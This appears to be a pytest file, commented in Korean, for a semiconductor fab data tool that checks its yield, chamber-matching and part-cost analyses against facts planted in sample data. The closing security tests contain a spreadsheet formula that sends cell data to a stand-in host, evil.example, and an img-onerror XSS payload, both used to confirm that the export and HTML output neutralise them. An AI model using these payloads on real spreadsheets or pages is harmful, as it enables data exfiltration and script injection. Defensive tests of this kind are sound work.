"""샘플 데이터에 '심어 둔 사실'을 각 분석이 그대로 찾아내는지 확인.

실행: python -m pytest tests   (pytest 필요: pip install -r requirements-dev.txt)
"""

import io

import openpyxl
import pandas as pd
import pytest

import fdc
import parts
from common import classify_columns, html_safe, read_pasted, to_excel
from samples import sample_cost, sample_fdc


def frame(text):
    return classify_columns(read_pasted(text))


def renamed(text, columns):
    """같은 데이터를 열 이름만 바꿔서 다시 탭 구분 텍스트로."""
    df = read_pasted(text)
    df.columns = columns
    return df.to_csv(sep="\t", index=False)


# ── FDC ──────────────────────────────────────────────────────────────────────

@pytest.fixture(scope="module")
def fdc_wide():
    long_text, result_text = sample_fdc()
    df, num, _, dates = frame(long_text)
    m, _ = fdc.auto_map_fdc(df, num, dates)
    keys = [m["LOT"], m["Wafer"]]
    wide = fdc.pivot_long(df, keys, m["Step"], m["파라미터"], m["값"], ["평균"])
    wide, matched = fdc.merge_result(wide, keys, result_text)
    wdf, wnum, _, _ = classify_columns(wide)
    params = [c for c in wnum if c not in ("수율(%)", *keys)]
    return wdf, params, matched


def test_fdc_columns_by_name():
    df, num, _, dates = frame(sample_fdc()[0])
    m, _ = fdc.auto_map_fdc(df, num, dates)
    assert m == {"LOT": "LOT_ID", "Wafer": "WAFER", "Step": "Step", "파라미터": "파라미터", "값": "값"}


def test_fdc_columns_without_names():
    df, num, _, dates = frame(renamed(sample_fdc()[0], list("ABCDEFG")))
    m, how = fdc.auto_map_fdc(df, num, dates)
    assert m == {"LOT": "A", "Wafer": "B", "Step": "C", "파라미터": "F", "값": "G"}
    assert all(how[r] != "이름" for r in m)


def test_result_merge_ignores_wafer_notation():
    long_text, result_text = sample_fdc()
    res = read_pasted(result_text)
    res["WAFER"] = res["WAFER"].str.replace("W", "").astype(int).astype(str)  # W07 → 7
    res.columns = ["Lot", "Wafer No", "Yield"]
    df, num, _, dates = frame(long_text)
    m, _ = fdc.auto_map_fdc(df, num, dates)
    keys = [m["LOT"], m["Wafer"]]
    wide = fdc.pivot_long(df, keys, m["Step"], m["파라미터"], m["값"], ["평균"])
    _, matched = fdc.merge_result(wide, keys, res.to_csv(sep="\t", index=False))
    assert matched == 297  # 샘플 결과표는 마지막 3장 수율이 비어 있음


def test_good_bad_finds_planted_causes(fdc_wide):
    wdf, params, matched = fdc_wide
    assert matched == 297
    y = wdf["수율(%)"]
    good = y >= y.median()
    res = fdc.gb_table(wdf, params, "수율(%)", good, ~good & y.notna())
    top = res.head(2)
    assert set(top["파라미터"]) == {"ETCH:Chamber_Press", "ETCH:ESC_Temp"}
    assert (top["판정"] == "🔴 주요 의심").all()


def test_chamber_matching_flags_offset_tool_only(fdc_wide):
    wdf, params, _ = fdc_wide
    m = fdc.chamber_matching(wdf, wdf["ETCH:설비"], fdc.step_params("ETCH:설비", params))
    press = m[m["파라미터"] == "ETCH:Chamber_Press"].set_index("챔버")["판정"]
    assert press["ETCH-03"] == "🔴 불일치"
    assert press["ETCH-01"] != "🔴 불일치" and press["ETCH-02"] != "🔴 불일치"


# ── 부품 비용 ────────────────────────────────────────────────────────────────

KOREAN = ["사용일", "설비", "부품코드", "부품명", "구분", "수량", "단가", "금액"]


@pytest.fixture(scope="module")
def cost():
    df, num, _, dates = frame(sample_cost()[0])
    m, _ = parts.auto_map_cost(df, num, dates)
    c = parts.cost_frame(df, m)
    return c.assign(기간=c["날짜"].dt.to_period("M").astype(str))


@pytest.mark.parametrize("columns", [
    KOREAN,
    ["Date", "EQP", "Part No", "Description", "Type", "Q'ty", "U/P", "Total"],
    list("ABCDEFGH"),
])
def test_cost_columns(columns):
    df, num, _, dates = frame(renamed(sample_cost()[0], columns))
    m, _ = parts.auto_map_cost(df, num, dates)
    expected = dict(zip(["날짜", "설비", "부품코드", "부품", "구분", "수량", "단가", "금액"], columns))
    assert m == expected


def test_decompose_finds_valve_price_rise(cost):
    total, items = parts.decompose(cost, "2024-11", "2024-12")
    keys = list(total)
    assert sum(total[k] for k in keys[1:-1]) == pytest.approx(total[keys[-1]] - total[keys[0]])
    valve = items.loc["Valve · 교체"]
    assert 1.1 < valve["단가_B"] / valve["단가_A"] < 1.3  # 12월 Valve 단가 +20%
    assert valve["단가 효과"] > 0


def test_early_replacement(cost):
    _, summary = parts.replacement_cycles(cost, ["교체"], 50)
    early = summary.set_index(["설비", "부품"])["조기 교체"]
    assert early[("ETCH-03", "Showerhead")] == 3
    assert early.drop([("ETCH-03", "Showerhead"), ("ETCH-01", "O-Ring")]).sum() == 0


def test_cost_anomalies_are_the_planted_input_errors(cost):
    reasons = parts.cost_anomalies(cost)["사유"]
    assert len(reasons) == 4
    assert reasons.str.startswith("단가 이상").sum() == 1
    assert reasons.str.startswith("금액 ≠ 수량×단가").sum() == 1
    assert (reasons == "중복 입력 의심").sum() == 2


def test_cost_per_wafer(cost):
    prod, by_eq = parts.parse_production(sample_cost()[1])
    _, total = parts.cost_per_wafer(cost, prod, by_eq)
    assert total.index[0] == "ETCH-03"


def test_fdc_link_heater_replacement():
    fl = parts.parse_fdc_aux(sample_fdc()[0])
    ch = parts.fdc_change(fl, "CVD-02", pd.Timestamp("2024-03-06"), 7).set_index("파라미터")
    heater = ch.loc["DEP:Heater_Temp"]
    assert heater["산포비(후/전)"] < 0.67 and heater["판정"] == "🔴 변화 큼"


# ── 보안 ─────────────────────────────────────────────────────────────────────

def test_excel_does_not_store_formulas():
    df = pd.DataFrame({"부품": ['=HYPERLINK("http://evil.example/?d="&A1,"x")', "+1", "@SUM(A1)"]})
    wb = openpyxl.load_workbook(io.BytesIO(to_excel({"t": df})))
    assert not [c for row in wb["t"].iter_rows() for c in row if c.data_type == "f"]


def test_html_tables_escape_markup():
    df = pd.DataFrame({"<b>열</b>": ["<img src=x onerror=alert(1)>"]})
    html = html_safe(df).style.to_html()
    assert "<img" not in html and "&lt;img" in html
